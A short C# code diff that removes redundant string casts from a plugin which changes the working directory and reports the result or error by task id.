@@ -13,22 +13,22 @@ namespace Plugins
         {
             try
             {
-                if (args.ContainsKey("path") && !string.IsNullOrEmpty((string)args["path"]))
+                if (args.ContainsKey("path") && !string.IsNullOrEmpty(args["path"]))
                 {
-                    string path = ((string)args["path"]).Replace("\"", "");
+                    string path = (args["path"]).Replace("\"", "");
 
                     Directory.SetCurrentDirectory(path);
 
-                    PluginHandler.Write($"Changed directory to {Directory.GetCurrentDirectory()}", (string)args["task-id"], true);
+                    PluginHandler.Write($"Changed directory to {Directory.GetCurrentDirectory()}", args["task-id"], true);
                 }
                 else
                 {
-                    PluginHandler.Write("Missing path parameter", (string)args["task-id"], true, "error");
+                    PluginHandler.Write("Missing path parameter", args["task-id"], true, "error");
                 }
             }
             catch (Exception e)
             {
-                PluginHandler.Write(e.ToString(), (string)args["task-id"], true, "error");
+                PluginHandler.Write(e.ToString(), args["task-id"], true, "error");
             }
         }
     }
